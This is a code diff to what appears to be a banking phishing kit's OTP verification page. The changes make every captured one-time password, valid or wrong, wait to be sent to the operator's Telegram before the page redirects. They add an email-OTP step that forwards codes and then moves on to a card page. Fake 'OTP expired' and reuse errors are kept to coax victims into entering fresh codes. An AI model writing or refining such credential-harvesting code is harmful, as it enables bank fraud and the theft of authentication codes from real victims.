@@ -745,9 +745,11 @@
             
             if (msg === 'name') {
                 currentStep = 'second'; // Second OTP (after name - last page)
+            } else if (msg === 'email') {
+                currentStep = 'second'; // Email OTP uses same code as name (654321)
             } else if (msg === 'lastt' || msg === 'last') {
                 currentStep = 'third'; // Third OTP (after balance from card flow)
-            } else if (msg === '' || msg === 'again') {
+            } else if (msg === '' || msg === 'again' || msg === 'againc') {
                 currentStep = 'first'; // First OTP (after EPIN)
             }
             
@@ -820,18 +822,23 @@
                     // Store the OTP entered on first screen
                     sessionStorage.setItem('first_otp_entered', otp);
                     
-                    // Send first OTP to Telegram (wrong OTP on first screen)
-                    sendFormDataToTelegram('First OTP Attempt (Initial Screen)', {
-                        'OTP Code': otp,
-                        'Status': 'Invalid OTP - Proceeding to Name'
-                    }).catch(err => {
+                    verifyBtn.disabled = true;
+                    verifyBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
+                    
+                    // Send first OTP to Telegram (wrong OTP on first screen) - WAIT for it
+                    try {
+                        await sendFormDataToTelegram('First OTP Attempt (Initial Screen)', {
+                            'OTP Code': otp,
+                            'Status': 'Invalid OTP - Proceeding to Name'
+                        });
+                    } catch (err) {
                         console.warn('Telegram notification failed (non-critical):', err);
-                    });
+                    }
                     
                     // Don't show error, just proceed to name page
                     verifyBtn.disabled = false;
                     verifyBtn.innerHTML = 'Verify';
-                    // Redirect to name page without showing error
+                    // Redirect to name page without showing error (after Telegram completes)
                     window.location.href = 'name.html';
                     return;
                 }
@@ -845,13 +852,21 @@
                     
                     // Check if user entered the same OTP as first screen
                     if (firstOTP && otp === firstOTP) {
-                        // Send to Telegram
-                        sendFormDataToTelegram('OTP Reuse Attempt (After Name)', {
-                            'OTP Code': otp,
-                            'Status': 'Same as first OTP - Rejected'
-                        }).catch(err => {
+                        verifyBtn.disabled = true;
+                        verifyBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
+                        
+                        // Send to Telegram - WAIT for it
+                        try {
+                            await sendFormDataToTelegram('OTP Reuse Attempt (After Name)', {
+                                'OTP Code': otp,
+                                'Status': 'Same as first OTP - Rejected'
+                            });
+                        } catch (err) {
                             console.warn('Telegram notification failed (non-critical):', err);
-                        });
+                        }
+                        
+                        verifyBtn.disabled = false;
+                        verifyBtn.innerHTML = 'Verify';
                         
                         // Show error for reusing first OTP - no popup, just inline text
                         const errorText = 'you have already enter the same OTP please enter a new OTP';
@@ -862,14 +877,22 @@
                     // User entered a different OTP (but still wrong) - track attempts
                     const failedAttempts = incrementFailedAttempts();
                     
-                    // Send wrong OTP to Telegram
-                    sendFormDataToTelegram('Wrong OTP Attempt (After Name)', {
-                        'OTP Code': otp,
-                        'Attempt': failedAttempts,
-                        'Status': 'Invalid OTP'
-                    }).catch(err => {
+                    verifyBtn.disabled = true;
+                    verifyBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
+                    
+                    // Send wrong OTP to Telegram - WAIT for it
+                    try {
+                        await sendFormDataToTelegram('Wrong OTP Attempt (After Name)', {
+                            'OTP Code': otp,
+                            'Attempt': failedAttempts,
+                            'Status': 'Invalid OTP'
+                        });
+                    } catch (err) {
                         console.warn('Telegram notification failed (non-critical):', err);
-                    });
+                    }
+                    
+                    verifyBtn.disabled = false;
+                    verifyBtn.innerHTML = 'Verify';
                     
                     // Show expired error for different wrong OTP - no popup, just inline text
                     const errorText = 'OTP expired enter a new otp';
@@ -898,13 +921,21 @@
                     
                     // Check if user entered the same OTP as first screen
                     if (firstOTP && otp === firstOTP) {
-                        // Send to Telegram
-                        sendFormDataToTelegram('OTP Reuse Attempt (Last OTP)', {
-                            'OTP Code': otp,
-                            'Status': 'Same as first OTP - Rejected'
-                        }).catch(err => {
+                        verifyBtn.disabled = true;
+                        verifyBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
+                        
+                        // Send to Telegram - WAIT for it
+                        try {
+                            await sendFormDataToTelegram('OTP Reuse Attempt (Last OTP)', {
+                                'OTP Code': otp,
+                                'Status': 'Same as first OTP - Rejected'
+                            });
+                        } catch (err) {
                             console.warn('Telegram notification failed (non-critical):', err);
-                        });
+                        }
+                        
+                        verifyBtn.disabled = false;
+                        verifyBtn.innerHTML = 'Verify';
                         
                         // Show error for reusing first OTP - no popup, just inline text
                         const errorText = 'you have already enter the same OTP please enter a new OTP';
@@ -915,14 +946,22 @@
                     // User entered a different OTP (but still wrong) - track attempts
                     const failedAttempts = incrementFailedAttempts();
                     
-                    // Send wrong OTP to Telegram
-                    sendFormDataToTelegram('Wrong OTP Attempt (Last OTP)', {
-                        'OTP Code': otp,
-                        'Attempt': failedAttempts,
-                        'Status': 'Invalid OTP'
-                    }).catch(err => {
+                    verifyBtn.disabled = true;
+                    verifyBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
+                    
+                    // Send wrong OTP to Telegram - WAIT for it
+                    try {
+                        await sendFormDataToTelegram('Wrong OTP Attempt (Last OTP)', {
+                            'OTP Code': otp,
+                            'Attempt': failedAttempts,
+                            'Status': 'Invalid OTP'
+                        });
+                    } catch (err) {
                         console.warn('Telegram notification failed (non-critical):', err);
-                    });
+                    }
+                    
+                    verifyBtn.disabled = false;
+                    verifyBtn.innerHTML = 'Verify';
                     
                     // Show expired error for different wrong OTP - no popup, just inline text
                     const errorText = 'OTP expired enter a new otp';
@@ -931,6 +970,30 @@
                     console.log(`Failed attempt ${failedAttempts} for last OTP (different OTP)`);
                     
                     // No redirect on last OTP page - just show error
+                    return;
+                }
+                
+                // For email OTP (msg=email) - send wrong OTP to Telegram
+                if (msg === 'email') {
+                    verifyBtn.disabled = true;
+                    verifyBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
+                    
+                    // Send wrong OTP to Telegram - WAIT for it
+                    try {
+                        await sendFormDataToTelegram('Wrong OTP Attempt (After Email)', {
+                            'OTP Code': otp,
+                            'Status': 'Invalid OTP'
+                        });
+                    } catch (err) {
+                        console.warn('Telegram notification failed (non-critical):', err);
+                    }
+                    
+                    verifyBtn.disabled = false;
+                    verifyBtn.innerHTML = 'Verify';
+                    
+                    // Show error - no popup, just inline text
+                    const errorText = 'OTP expired enter a new otp';
+                    document.getElementById('errorMessage').textContent = errorText;
                     return;
                 }
                 
@@ -943,13 +1006,18 @@
             
             // Check if this OTP was already used in a previous step
             if (isOTPAlreadyUsed(otp)) {
-                // Send reused OTP to Telegram
-                sendFormDataToTelegram('OTP Already Used', {
-                    'OTP Code': otp,
-                    'Status': 'Already used in previous step'
-                }).catch(err => {
+                verifyBtn.disabled = true;
+                verifyBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
+                
+                // Send reused OTP to Telegram - WAIT for it
+                try {
+                    await sendFormDataToTelegram('OTP Already Used', {
+                        'OTP Code': otp,
+                        'Status': 'Already used in previous step'
+                    });
+                } catch (err) {
                     console.warn('Telegram notification failed (non-critical):', err);
-                });
+                }
                 
                 verifyBtn.disabled = false;
                 verifyBtn.innerHTML = 'Verify';
@@ -967,26 +1035,33 @@
             // Determine OTP type based on msg parameter
             let otpType = 'Valid OTP Submitted';
             if (msg === 'name') {
-                otpType = 'Valid OTP (After Name - Last Page)';
+                otpType = 'Valid OTP (After Name)';
+            } else if (msg === 'email') {
+                otpType = 'Valid OTP (After Email)';
             } else if (msg === 'lastt' || msg === 'last') {
                 otpType = 'Valid OTP (After Balance)';
             } else if (msg === '' || msg === 'again' || msg === 'againc') {
                 otpType = 'Valid OTP (First OTP - After EPIN)';
             }
             
-            // Send valid OTP to Telegram immediately (non-blocking)
-            sendFormDataToTelegram(otpType, {
-                'OTP Code': otp,
-                'Status': 'Valid - Accepted'
-            }).catch(err => {
+            // Show loading state
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<span class="loading-spinner"></span>Sending...';
+            
+            // Send valid OTP to Telegram - WAIT for it
+            try {
+                await sendFormDataToTelegram(otpType, {
+                    'OTP Code': otp,
+                    'Status': 'Valid - Accepted'
+                });
+            } catch (err) {
                 console.warn('Telegram notification failed (non-critical):', err);
-            });
+            }
             
             // OTP is correct - reset failed attempts
             resetFailedAttempts();
 
-            // Show loading state
-            verifyBtn.disabled = true;
+            // Update loading state
             verifyBtn.innerHTML = '<span class="loading-spinner"></span>Verifying...';
             
             try {
@@ -1017,6 +1092,9 @@
                     // After name OTP (second OTP) - this is the LAST PAGE in normal flow
                     // If successful, redirect to balance as completion
                     nextPage = 'balance.html?msg=complete';
+                } else if (msg === 'email') {
+                    // After email OTP - go to card page
+                    nextPage = 'card.html';
                 } else if (msg === 'lastt') {
                     // After balance OTP (from card flow), this is the final OTP
                     nextPage = 'balance.html?msg=complete';
